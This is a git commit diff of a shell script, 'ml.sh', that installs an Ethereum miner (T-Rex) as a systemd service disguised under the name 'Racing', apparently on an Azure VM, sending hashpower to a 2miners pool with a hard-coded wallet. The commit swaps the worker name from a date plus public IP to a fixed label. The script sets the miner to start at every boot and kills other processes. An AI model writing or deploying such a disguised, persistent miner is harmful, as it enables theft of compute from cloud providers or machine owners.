ee32d03ec5158ca3ad3872d08bd592fab3f045e0
dinhtrungac1 <91616570+dinhtrungac1@users.noreply.github.com>
2021-11-04 04:53:28 -0400

    Update ml.sh

--- ml.sh
+++ ml.sh
@@ -1,6 +1,6 @@
-woker=$(date +'%d%m_%H_')
-myip="$(dig +short myip.opendns.com @resolver1.opendns.com)"
-woker+=$myip
+woker=$(date +'%d%m_')
+name=ML_qvelasquez233
+woker+=$name
 
 sudo apt-get install linux-headers-$(uname -r) -y
 distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
@@ -12,4 +12,3 @@ sudo killall XXX
 sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/azureuser/t-rex -a ethash -o us-eth.2miners.com:2020 -u 0xb3c4278f22af4065c55db747e4efa8ed4ff02153 -p x -w 0000mlscript\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
-
